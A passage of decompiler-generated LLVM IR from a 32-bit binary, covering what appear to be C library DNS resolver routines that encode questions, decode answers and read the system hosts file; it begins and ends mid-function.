  store i32 %v2_8058113, i32* %v3_8058116, align 4
  %v0_8058119 = load i32, i32* @ecx, align 4
  %v1_8058119 = add i32 %v0_8058119, 2
  %v2_8058119 = inttoptr i32 %v1_8058119 to i8*
  %v3_8058119 = load i8, i8* %v2_8058119, align 1
  %v3_805811c = udiv i8 %v3_8058119, 8
  %tmp7 = urem i8 %v3_805811c, 16
  %v1_805811f = zext i8 %tmp7 to i32
  %v1_8058122 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058122 = add i32 %v1_8058122, 8
  %v3_8058122 = inttoptr i32 %v2_8058122 to i32*
  store i32 %v1_805811f, i32* %v3_8058122, align 4
  %v0_8058125 = load i32, i32* @ecx, align 4
  %v1_8058125 = add i32 %v0_8058125, 2
  %v2_8058125 = inttoptr i32 %v1_8058125 to i8*
  %v3_8058125 = load i8, i8* %v2_8058125, align 1
  %div = udiv i8 %v3_8058125, 4
  %tmp8 = urem i8 %div, 2
  %v1_805812c = zext i8 %tmp8 to i32
  %v1_805812f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805812f = add i32 %v1_805812f, 12
  %v3_805812f = inttoptr i32 %v2_805812f to i32*
  store i32 %v1_805812c, i32* %v3_805812f, align 4
  %v0_8058132 = load i32, i32* @ecx, align 4
  %v1_8058132 = add i32 %v0_8058132, 2
  %v2_8058132 = inttoptr i32 %v1_8058132 to i8*
  %v3_8058132 = load i8, i8* %v2_8058132, align 1
  %div5 = udiv i8 %v3_8058132, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8058138 = zext i8 %tmp9 to i32
  %v1_805813b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805813b = add i32 %v1_805813b, 16
  %v3_805813b = inttoptr i32 %v2_805813b to i32*
  store i32 %v1_8058138, i32* %v3_805813b, align 4
  %v0_805813e = load i32, i32* @ecx, align 4
  %v1_805813e = add i32 %v0_805813e, 2
  %v2_805813e = inttoptr i32 %v1_805813e to i8*
  %v3_805813e = load i8, i8* %v2_805813e, align 1
  %tmp10 = urem i8 %v3_805813e, 2
  %v1_8058142 = zext i8 %tmp10 to i32
  %v1_8058145 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058145 = add i32 %v1_8058145, 20
  %v3_8058145 = inttoptr i32 %v2_8058145 to i32*
  store i32 %v1_8058142, i32* %v3_8058145, align 4
  %v0_8058148 = load i32, i32* @ecx, align 4
  %v1_8058148 = add i32 %v0_8058148, 3
  %v2_8058148 = inttoptr i32 %v1_8058148 to i8*
  %v3_8058148 = load i8, i8* %v2_8058148, align 1
  %tmp11 = icmp slt i8 %v3_8058148, 0
  %v2_805814c = zext i1 %tmp11 to i32
  %v1_805814f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805814f = add i32 %v1_805814f, 24
  %v3_805814f = inttoptr i32 %v2_805814f to i32*
  store i32 %v2_805814c, i32* %v3_805814f, align 4
  %v0_8058152 = load i32, i32* @ecx, align 4
  %v1_8058152 = add i32 %v0_8058152, 3
  %v2_8058152 = inttoptr i32 %v1_8058152 to i8*
  %v3_8058152 = load i8, i8* %v2_8058152, align 1
  %tmp12 = urem i8 %v3_8058152, 16
  %v1_8058156 = zext i8 %tmp12 to i32
  %v1_8058159 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058159 = add i32 %v1_8058159, 28
  %v3_8058159 = inttoptr i32 %v2_8058159 to i32*
  store i32 %v1_8058156, i32* %v3_8058159, align 4
  %v0_805815c = load i32, i32* @ecx, align 4
  %v1_805815c = add i32 %v0_805815c, 4
  %v2_805815c = inttoptr i32 %v1_805815c to i8*
  %v3_805815c = load i8, i8* %v2_805815c, align 1
  %v4_805815c = zext i8 %v3_805815c to i32
  %v1_8058160 = add i32 %v0_805815c, 5
  %v2_8058160 = inttoptr i32 %v1_8058160 to i8*
  %v3_8058160 = load i8, i8* %v2_8058160, align 1
  %v4_8058160 = zext i8 %v3_8058160 to i32
  %v2_8058164 = mul nuw nsw i32 %v4_805815c, 256
  %v2_8058167 = or i32 %v4_8058160, %v2_8058164
  %v1_8058169 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058169 = add i32 %v1_8058169, 32
  %v3_8058169 = inttoptr i32 %v2_8058169 to i32*
  store i32 %v2_8058167, i32* %v3_8058169, align 4
  %v0_805816c = load i32, i32* @ecx, align 4
  %v1_805816c = add i32 %v0_805816c, 6
  %v2_805816c = inttoptr i32 %v1_805816c to i8*
  %v3_805816c = load i8, i8* %v2_805816c, align 1
  %v4_805816c = zext i8 %v3_805816c to i32
  %v1_8058170 = add i32 %v0_805816c, 7
  %v2_8058170 = inttoptr i32 %v1_8058170 to i8*
  %v3_8058170 = load i8, i8* %v2_8058170, align 1
  %v4_8058170 = zext i8 %v3_8058170 to i32
  %v2_8058174 = mul nuw nsw i32 %v4_805816c, 256
  %v2_8058177 = or i32 %v4_8058170, %v2_8058174
  %v1_8058179 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058179 = add i32 %v1_8058179, 36
  %v3_8058179 = inttoptr i32 %v2_8058179 to i32*
  store i32 %v2_8058177, i32* %v3_8058179, align 4
  %v0_805817c = load i32, i32* @ecx, align 4
  %v1_805817c = add i32 %v0_805817c, 8
  %v2_805817c = inttoptr i32 %v1_805817c to i8*
  %v3_805817c = load i8, i8* %v2_805817c, align 1
  %v4_805817c = zext i8 %v3_805817c to i32
  %v1_8058180 = add i32 %v0_805817c, 9
  %v2_8058180 = inttoptr i32 %v1_8058180 to i8*
  %v3_8058180 = load i8, i8* %v2_8058180, align 1
  %v4_8058180 = zext i8 %v3_8058180 to i32
  %v2_8058184 = mul nuw nsw i32 %v4_805817c, 256
  %v2_8058187 = or i32 %v4_8058180, %v2_8058184
  %v1_8058189 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058189 = add i32 %v1_8058189, 40
  %v3_8058189 = inttoptr i32 %v2_8058189 to i32*
  store i32 %v2_8058187, i32* %v3_8058189, align 4
  %v0_805818c = load i32, i32* @ecx, align 4
  %v1_805818c = add i32 %v0_805818c, 10
  %v2_805818c = inttoptr i32 %v1_805818c to i8*
  %v3_805818c = load i8, i8* %v2_805818c, align 1
  %v4_805818c = zext i8 %v3_805818c to i32
  %v1_8058190 = add i32 %v0_805818c, 11
  %v2_8058190 = inttoptr i32 %v1_8058190 to i8*
  %v3_8058190 = load i8, i8* %v2_8058190, align 1
  %v4_8058190 = zext i8 %v3_8058190 to i32
  %v2_8058194 = mul nuw nsw i32 %v4_805818c, 256
  %v2_8058197 = or i32 %v4_8058190, %v2_8058194
  %v1_8058199 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058199 = add i32 %v1_8058199, 44
  %v3_8058199 = inttoptr i32 %v2_8058199 to i32*
  store i32 %v2_8058197, i32* %v3_8058199, align 4
  %v2_80581a1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80581a1, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 10, 11, 4, 5, 9, 17, 6, 12, 13, 14, 15, 7, 16, 3, 8, 0, 2, 1 }
  uselistorder i32 7, { 12, 13, 3, 8, 4, 2, 9, 14, 15, 16, 17, 18, 5, 0, 11, 6, 7, 10, 1 }
  uselistorder i32 6, { 25, 26, 0, 1, 10, 27, 4, 19, 11, 12, 8, 29, 13, 28, 5, 6, 3, 7, 9, 14, 15, 23, 16, 17, 18, 20, 21, 22, 24, 2 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 22, 6, 0, 26, 23, 7, 8, 9, 10, 11, 24, 25, 12, 18, 13, 19, 14, 20, 21, 15, 17, 16 }
  uselistorder i8 16, { 0, 1, 2, 6, 7, 8, 4, 5, 3 }
  uselistorder i8 8, { 0, 3, 8, 4, 5, 6, 7, 1, 2 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80581a4 = load i32, i32* @edi, align 4
  %v0_80581a5 = load i32, i32* @esi, align 4
  %v0_80581a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80581a6, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_80581b3 = load i32, i32* @eax, align 4
  %v1_80581b6 = inttoptr i32 %tmp to i32*
  %v2_80581b6 = load i32, i32* %v1_80581b6, align 4
  %v7_80581b8 = inttoptr i32 %v2_80581b6 to i8*
  %v8_80581b8 = call i32 @__encode_dotted(i8* %v7_80581b8, i32 %tmp2, i32 %tmp3, i32 %v0_80581b3, i32 %v0_80581a6, i32 %v0_80581a5, i32 %v0_80581a4)
  %v2_80581c0 = icmp slt i32 %v8_80581b8, 0
  store i32 %v8_80581b8, i32* @ecx, align 4
  br i1 %v2_80581c0, label %dec_label_pc_80581f1, label %dec_label_pc_80581c6

dec_label_pc_80581c6:                             ; preds = %entry
  %v0_80581c6 = load i32, i32* @ebx, align 4
  %v2_80581c6 = sub i32 %v0_80581c6, %v8_80581b8
  %v1_80581c8 = add i32 %v2_80581c6, -3
  %v6_80581c8 = sub i32 2, %v2_80581c6
  %v7_80581c8 = and i32 %v6_80581c8, %v2_80581c6
  %v8_80581c8 = icmp slt i32 %v7_80581c8, 0
  %v9_80581c8 = icmp eq i32 %v1_80581c8, 0
  %v10_80581c8 = icmp slt i32 %v1_80581c8, 0
  %v3_80581cb = icmp eq i1 %v10_80581c8, %v8_80581c8
  %v4_80581cb = icmp eq i1 %v9_80581c8, false
  %v5_80581cb = and i1 %v4_80581cb, %v3_80581cb
  br i1 %v5_80581cb, label %dec_label_pc_80581d2, label %dec_label_pc_80581cd

dec_label_pc_80581cd:                             ; preds = %dec_label_pc_80581c6
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_80581f1

dec_label_pc_80581d2:                             ; preds = %dec_label_pc_80581c6
  %v0_80581d2 = load i32, i32* @edi, align 4
  %v2_80581d2 = add i32 %v0_80581d2, %v8_80581b8
  store i32 %v2_80581d2, i32* @edx, align 4
  %v0_80581d5 = load i32, i32* @esi, align 4
  %v1_80581d5 = add i32 %v0_80581d5, 5
  %v2_80581d5 = inttoptr i32 %v1_80581d5 to i8*
  %v3_80581d5 = load i8, i8* %v2_80581d5, align 1
  %v1_80581d9 = add i32 %v8_80581b8, 4
  store i32 %v1_80581d9, i32* @ecx, align 4
  %v3_80581dc = inttoptr i32 %v2_80581d2 to i8*
  store i8 %v3_80581d5, i8* %v3_80581dc, align 1
  %v0_80581de = load i32, i32* @esi, align 4
  %v1_80581de = add i32 %v0_80581de, 4
  %v2_80581de = inttoptr i32 %v1_80581de to i32*
  %v3_80581de = load i32, i32* %v2_80581de, align 4
  %v1_80581e1 = trunc i32 %v3_80581de to i8
  %v2_80581e1 = load i32, i32* @edx, align 4
  %v3_80581e1 = add i32 %v2_80581e1, 1
  %v4_80581e1 = inttoptr i32 %v3_80581e1 to i8*
  store i8 %v1_80581e1, i8* %v4_80581e1, align 1
  %v0_80581e4 = load i32, i32* @esi, align 4
  %v1_80581e4 = add i32 %v0_80581e4, 9
  %v2_80581e4 = inttoptr i32 %v1_80581e4 to i8*
  %v3_80581e4 = load i8, i8* %v2_80581e4, align 1
  %v2_80581e8 = load i32, i32* @edx, align 4
  %v3_80581e8 = add i32 %v2_80581e8, 2
  %v4_80581e8 = inttoptr i32 %v3_80581e8 to i8*
  store i8 %v3_80581e4, i8* %v4_80581e8, align 1
  %v0_80581eb = load i32, i32* @esi, align 4
  %v1_80581eb = add i32 %v0_80581eb, 8
  %v2_80581eb = inttoptr i32 %v1_80581eb to i32*
  %v3_80581eb = load i32, i32* %v2_80581eb, align 4
  %v1_80581ee = trunc i32 %v3_80581eb to i8
  %v2_80581ee = load i32, i32* @edx, align 4
  %v3_80581ee = add i32 %v2_80581ee, 3
  %v4_80581ee = inttoptr i32 %v3_80581ee to i8*
  store i8 %v1_80581ee, i8* %v4_80581ee, align 1
  %v0_80581f2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80581f1

dec_label_pc_80581f1:                             ; preds = %entry, %dec_label_pc_80581cd, %dec_label_pc_80581d2
  %v0_80581f2 = phi i32 [ %v8_80581b8, %entry ], [ -1, %dec_label_pc_80581cd ], [ %v0_80581f2.pre, %dec_label_pc_80581d2 ]
  %v2_80581f1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80581f1, i32* @ebx, align 4
  store i32 %v0_80581a4, i32* @edi, align 4
  ret i32 %v0_80581f2

; uselistorder directives
  uselistorder i32 %v1_80581c8, { 1, 0 }
  uselistorder i32 %v2_80581c6, { 0, 2, 1 }
  uselistorder i32 %v8_80581b8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 7, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_80581f1, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8058203 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8058208 = icmp slt i32 %v2_8058203, 0
  %v1_805820a = add i32 %v2_8058203, 4
  %v1_805820d = icmp eq i1 %v2_8058208, false
  %v4_805820d = select i1 %v1_805820d, i32 %v1_805820a, i32 %v2_8058203
  ret i32 %v4_805820d

; uselistorder directives
  uselistorder i32 %v2_8058203, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058214 = load i32, i32* @ebp, align 4
  %v0_8058215 = load i32, i32* @edi, align 4
  %v0_8058216 = load i32, i32* @esi, align 4
  %v0_8058217 = load i32, i32* @ebx, align 4
  store i32 %v0_8058217, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8058238 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8058238, i32* %eax.global-to-local, align 4
  %v4_8058245 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8058238, i32 256)
  store i32 %v4_8058245, i32* %eax.global-to-local, align 4
  %v3_805824d = icmp slt i32 %v4_8058245, 0
  store i32 %v4_8058245, i32* @edi, align 4
  br i1 %v3_805824d, label %dec_label_pc_8058300, label %dec_label_pc_8058257

dec_label_pc_8058257:                             ; preds = %entry
  %v0_8058257 = load i32, i32* @ebx, align 4
  %v3_8058257 = add i32 %v0_8058257, %v4_8058245
  %v0_8058259 = load i32, i32* @esi, align 4
  %v2_8058259 = sub i32 %v0_8058259, %v3_8058257
  %v1_805825b = add i32 %v2_8058259, -10
  %v10_805825b = icmp slt i32 %v1_805825b, 0
  store i32 %v1_805825b, i32* @esi, align 4
  %v1_8058266 = icmp eq i1 %v10_805825b, false
  br i1 %v1_8058266, label %dec_label_pc_805826f, label %dec_label_pc_8058268

dec_label_pc_8058268:                             ; preds = %dec_label_pc_8058257
  br label %dec_label_pc_8058300

dec_label_pc_805826f:                             ; preds = %dec_label_pc_8058257
  %v6_8058276 = add i32 %v3_8058257, %tmp4
  store i32 %v6_8058276, i32* @ebx, align 4
  store i32 %v2_8058238, i32* %eax.global-to-local, align 4
  %v1_8058282 = bitcast i32* %stack_var_-272 to i8*
  %v2_8058282 = call i32 @__GI_strdup(i8* %v1_8058282)
  store i32 %v2_8058282, i32* %eax.global-to-local, align 4
  %v0_8058287 = load i32, i32* @ebx, align 4
  %v1_8058287 = add i32 %v0_8058287, 4
  store i32 %v1_8058287, i32* %esi.global-to-local, align 4
  %v1_805828a = load i32, i32* @ebp, align 4
  %v2_805828a = inttoptr i32 %v1_805828a to i32*
  store i32 %v2_8058282, i32* %v2_805828a, align 4
  %v0_805828d = load i32, i32* @ebx, align 4
  %v1_805828d = inttoptr i32 %v0_805828d to i8*
  %v2_805828d = load i8, i8* %v1_805828d, align 1
  %v3_805828d = zext i8 %v2_805828d to i32
  store i32 %v3_805828d, i32* %eax.global-to-local, align 4
  %v1_8058290 = add i32 %v0_805828d, 1
  %v2_8058290 = inttoptr i32 %v1_8058290 to i8*
  %v3_8058290 = load i8, i8* %v2_8058290, align 1
  %v4_8058290 = zext i8 %v3_8058290 to i32
  store i32 %v4_8058290, i32* %edx.global-to-local, align 4
  %v2_8058294 = mul nuw nsw i32 %v3_805828d, 256
  %v2_8058297 = or i32 %v4_8058290, %v2_8058294
  store i32 %v2_8058297, i32* %eax.global-to-local, align 4
  %v1_8058299 = load i32, i32* @ebp, align 4
  %v2_8058299 = add i32 %v1_8058299, 4
  %v3_8058299 = inttoptr i32 %v2_8058299 to i32*
  store i32 %v2_8058297, i32* %v3_8058299, align 4
  %v0_805829c = load i32, i32* @ebx, align 4
  %v1_805829c = add i32 %v0_805829c, 2
  %v2_805829c = inttoptr i32 %v1_805829c to i8*
  %v3_805829c = load i8, i8* %v2_805829c, align 1
  %v4_805829c = zext i8 %v3_805829c to i32
  store i32 %v4_805829c, i32* %eax.global-to-local, align 4
  %v1_80582a0 = add i32 %v0_805829c, 3
  %v2_80582a0 = inttoptr i32 %v1_80582a0 to i8*
  %v3_80582a0 = load i8, i8* %v2_80582a0, align 1
  %v4_80582a0 = zext i8 %v3_80582a0 to i32
  store i32 %v4_80582a0, i32* %edx.global-to-local, align 4
  %v2_80582a4 = mul nuw nsw i32 %v4_805829c, 256
  %v2_80582a7 = or i32 %v4_80582a0, %v2_80582a4
  store i32 %v2_80582a7, i32* %eax.global-to-local, align 4
  %v1_80582a9 = load i32, i32* @ebp, align 4
  %v2_80582a9 = add i32 %v1_80582a9, 8
  %v3_80582a9 = inttoptr i32 %v2_80582a9 to i32*
  store i32 %v2_80582a7, i32* %v3_80582a9, align 4
  %v0_80582ac = load i32, i32* @ebx, align 4
  %v1_80582ac = add i32 %v0_80582ac, 4
  %v2_80582ac = inttoptr i32 %v1_80582ac to i8*
  %v3_80582ac = load i8, i8* %v2_80582ac, align 1
  %v4_80582ac = zext i8 %v3_80582ac to i32
  store i32 %v4_80582ac, i32* %edx.global-to-local, align 4
  %v0_80582b0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80582b0 = add i32 %v0_80582b0, 1
  %v2_80582b0 = inttoptr i32 %v1_80582b0 to i8*
  %v3_80582b0 = load i8, i8* %v2_80582b0, align 1
  %v4_80582b0 = zext i8 %v3_80582b0 to i32
  store i32 %v4_80582b0, i32* %eax.global-to-local, align 4
  %v1_80582b4 = add i32 %v0_80582b0, 2
  %v2_80582b4 = inttoptr i32 %v1_80582b4 to i8*
  %v3_80582b4 = load i8, i8* %v2_80582b4, align 1
  %v4_80582b4 = zext i8 %v3_80582b4 to i32
  %v2_80582b8 = mul nuw i32 %v4_80582ac, 16777216
  %v2_80582bb = mul nuw nsw i32 %v4_80582b0, 65536
  store i32 %v2_80582bb, i32* %eax.global-to-local, align 4
  %v2_80582be = or i32 %v2_80582bb, %v2_80582b8
  store i32 %v2_80582be, i32* %edx.global-to-local, align 4
  %v1_80582c0 = add i32 %v0_80582b0, 3
  %v2_80582c0 = inttoptr i32 %v1_80582c0 to i8*
  %v3_80582c0 = load i8, i8* %v2_80582c0, align 1
  %v4_80582c0 = zext i8 %v3_80582c0 to i32
  store i32 %v4_80582c0, i32* %eax.global-to-local, align 4
  %v2_80582c4 = mul nuw nsw i32 %v4_80582b4, 256
  %v2_80582c7 = or i32 %v4_80582c0, %v2_80582be
  store i32 %v2_80582c7, i32* %edx.global-to-local, align 4
  %v2_80582c9 = or i32 %v2_80582c7, %v2_80582c4
  store i32 %v2_80582c9, i32* @ecx, align 4
  %v1_80582cb = load i32, i32* @ebp, align 4
  %v2_80582cb = add i32 %v1_80582cb, 12
  %v3_80582cb = inttoptr i32 %v2_80582cb to i32*
  store i32 %v2_80582c9, i32* %v3_80582cb, align 4
  %v0_80582ce = load i32, i32* @ebx, align 4
  %v1_80582ce = add i32 %v0_80582ce, 8
  %v2_80582ce = inttoptr i32 %v1_80582ce to i8*
  %v3_80582ce = load i8, i8* %v2_80582ce, align 1
  %v4_80582ce = zext i8 %v3_80582ce to i32
  store i32 %v4_80582ce, i32* %edx.global-to-local, align 4
  %v1_80582d2 = add i32 %v0_80582ce, 9
  %v2_80582d2 = inttoptr i32 %v1_80582d2 to i8*
  %v3_80582d2 = load i8, i8* %v2_80582d2, align 1
  %v4_80582d2 = zext i8 %v3_80582d2 to i32
  store i32 %v4_80582d2, i32* %eax.global-to-local, align 4
  %v1_80582d6 = add i32 %v0_80582ce, 10
  %v1_80582d9 = load i32, i32* @ebp, align 4
  %v2_80582d9 = add i32 %v1_80582d9, 20
  %v3_80582d9 = inttoptr i32 %v2_80582d9 to i32*
  store i32 %v1_80582d6, i32* %v3_80582d9, align 4
  %v0_80582dc = load i32, i32* %edx.global-to-local, align 4
  %v2_80582dc = mul i32 %v0_80582dc, 256
  %v1_80582df = load i32, i32* %eax.global-to-local, align 4
  %v2_80582df = or i32 %v1_80582df, %v2_80582dc
  store i32 %v2_80582df, i32* @edx, align 4
  %v1_80582e1 = load i32, i32* @ebp, align 4
  %v2_80582e1 = add i32 %v1_80582e1, 16
  %v3_80582e1 = inttoptr i32 %v2_80582e1 to i32*
  store i32 %v2_80582df, i32* %v3_80582e1, align 4
  %v1_80582eb = add i32 %v3_8058257, 10
  store i32 %v1_80582eb, i32* %eax.global-to-local, align 4
  %v1_80582ee = load i32, i32* @ebp, align 4
  %v2_80582ee = add i32 %v1_80582ee, 24
  %v3_80582ee = inttoptr i32 %v2_80582ee to i32*
  store i32 %v1_80582eb, i32* %v3_80582ee, align 4
  %v4_80582f1 = load i32, i32* @edx, align 4
  %v5_80582f5 = icmp slt i32 %v1_805825b, %v4_80582f1
  br i1 %v5_80582f5, label %dec_label_pc_80582f7, label %dec_label_pc_80582fc

dec_label_pc_80582f7:                             ; preds = %dec_label_pc_805826f
  br label %dec_label_pc_8058300

dec_label_pc_80582fc:                             ; preds = %dec_label_pc_805826f
  %v1_80582fc = load i32, i32* @edi, align 4
  %v2_80582fc = add i32 %v4_80582f1, 10
  %v3_80582fc = add i32 %v2_80582fc, %v1_80582fc
  br label %dec_label_pc_8058300

dec_label_pc_8058300:                             ; preds = %entry, %dec_label_pc_80582f7, %dec_label_pc_8058268, %dec_label_pc_80582fc
  %v0_8058306 = phi i32 [ %v4_8058245, %entry ], [ -1, %dec_label_pc_80582f7 ], [ %v1_805825b, %dec_label_pc_8058268 ], [ %v3_80582fc, %dec_label_pc_80582fc ]
  store i32 %v0_8058306, i32* %eax.global-to-local, align 4
  %v2_8058308 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058308, i32* @ebx, align 4
  store i32 %v0_8058216, i32* @esi, align 4
  store i32 %v0_8058215, i32* @edi, align 4
  store i32 %v0_8058214, i32* @ebp, align 4
  ret i32 %v0_8058306

; uselistorder directives
  uselistorder i32 %v0_8058306, { 1, 0 }
  uselistorder i32 %v2_80582bb, { 1, 0 }
  uselistorder i32 %v1_805825b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8058257, { 1, 0, 2 }
  uselistorder i32 %v4_8058245, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8058238, { 1, 0, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10 }
  uselistorder i32 3, { 62, 63, 64, 65, 66, 67, 22, 0, 13, 1, 23, 2, 18, 68, 3, 69, 24, 5, 4, 6, 11, 12, 10, 25, 14, 26, 51, 21, 52, 35, 36, 37, 38, 39, 40, 70, 19, 20, 41, 27, 16, 17, 7, 33, 55, 32, 56, 31, 57, 30, 58, 29, 59, 42, 28, 43, 60, 61, 44, 45, 46, 47, 9, 53, 54, 8, 34, 48, 49, 50, 15 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8058300, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_805831d = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805eec5.1035 to i32), i32 ptrtoint (i32* @global_var_805ee90.1020 to i32))
  store i32 %v3_805831d, i32* @eax, align 4
  %v1_8058325 = icmp eq i32 %v3_805831d, 0
  %v1_8058327 = icmp eq i1 %v1_8058325, false
  br i1 %v1_8058327, label %dec_label_pc_805833d, label %dec_label_pc_8058329

dec_label_pc_8058329:                             ; preds = %entry
  %v3_8058335 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805eed0.1036 to i32), i32 ptrtoint (i32* @global_var_805ee90.1020 to i32))
  br label %dec_label_pc_805833d

dec_label_pc_805833d:                             ; preds = %entry, %dec_label_pc_8058329
  %v0_8058340 = phi i32 [ %v3_805831d, %entry ], [ %v3_8058335, %dec_label_pc_8058329 ]
  ret i32 %v0_8058340

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805ee90.1020 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_805833d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8058341 = load i32, i32* @ebp, align 4
  %v0_8058342 = load i32, i32* @edi, align 4
  %v0_8058343 = load i32, i32* @esi, align 4
  %v0_8058344 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8058352 = sub i32 0, %arg6
  %v1_8058354 = urem i32 %v1_8058352, 4
  %v2_8058354 = icmp eq i32 %v1_8058354, 0
  store i32 %v1_8058354, i32* %eax.global-to-local, align 4
  br i1 %v2_8058354, label %dec_label_pc_8058365, label %dec_label_pc_8058359

dec_label_pc_8058359:                             ; preds = %entry
  %v2_8058359 = sub i32 %arg7, %v1_8058354
  %v7_8058359 = icmp ugt i32 %v1_8058354, %arg7
  br i1 %v7_8058359, label %dec_label_pc_8058609, label %dec_label_pc_8058361

dec_label_pc_8058361:                             ; preds = %dec_label_pc_8058359
  %v2_8058361 = add i32 %v1_8058354, %arg6
  store i32 %v2_8058361, i32* @ebx, align 4
  store i32 %v2_8058359, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058365

dec_label_pc_8058365:                             ; preds = %entry, %dec_label_pc_8058361
  %v0_8058373 = phi i32 [ %arg6, %entry ], [ %v2_8058361, %dec_label_pc_8058361 ]
  %v0_805837a = phi i32 [ %arg7, %entry ], [ %v2_8058359, %dec_label_pc_8058361 ]
  %tmp = icmp ult i32 %v0_805837a, 32
  br i1 %tmp, label %dec_label_pc_8058609, label %dec_label_pc_805836e

dec_label_pc_805836e:                             ; preds = %dec_label_pc_8058365
  %v12_805836e = icmp eq i32 %arg4, 1
  %v1_8058373 = add i32 %v0_8058373, 32
  store i32 %v1_8058373, i32* %eax.global-to-local, align 4
  %v1_805837a = add i32 %v0_805837a, -32
  store i32 %v1_805837a, i32* @ebp, align 4
  br i1 %v12_805836e, label %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge, label %dec_label_pc_8058383

dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge: ; preds = %dec_label_pc_805836e
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80584b9

dec_label_pc_8058383:                             ; preds = %dec_label_pc_805836e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_805838a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_805838a, align 4
  %tmp144 = icmp ult i32 %v1_805837a, 4
  br i1 %tmp144, label %dec_label_pc_8058609, label %dec_label_pc_8058396

dec_label_pc_8058396:                             ; preds = %dec_label_pc_8058383
  %v0_8058396 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058396 = add i32 %v0_8058396, -36
  store i32 %v1_8058396, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_8058396, 8
  br i1 %tmp145, label %dec_label_pc_8058609, label %dec_label_pc_80583a2

dec_label_pc_80583a2:                             ; preds = %dec_label_pc_8058396
  %v0_80583a2 = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_80583a2, 16
  br i1 %tmp146, label %dec_label_pc_8058609, label %dec_label_pc_80583ab

dec_label_pc_80583ab:                             ; preds = %dec_label_pc_80583a2
  %v1_80583ab = add i32 %v0_8058396, -48
  store i32 %v1_80583ab, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_80583ab, 8
  br i1 %tmp147, label %dec_label_pc_8058609, label %dec_label_pc_80583b7

dec_label_pc_80583b7:                             ; preds = %dec_label_pc_80583ab
  %v0_80583b7 = load i32, i32* @ebx, align 4
  %v1_80583b7 = add i32 %v0_80583b7, 48
  %v1_80583ba = add i32 %v0_8058396, -44
  store i32 %v1_80583ba, i32* @ebp, align 4
  %v1_80583c1 = add i32 %v0_8058396, -56
  store i32 %v1_80583c1, i32* @eax, align 4
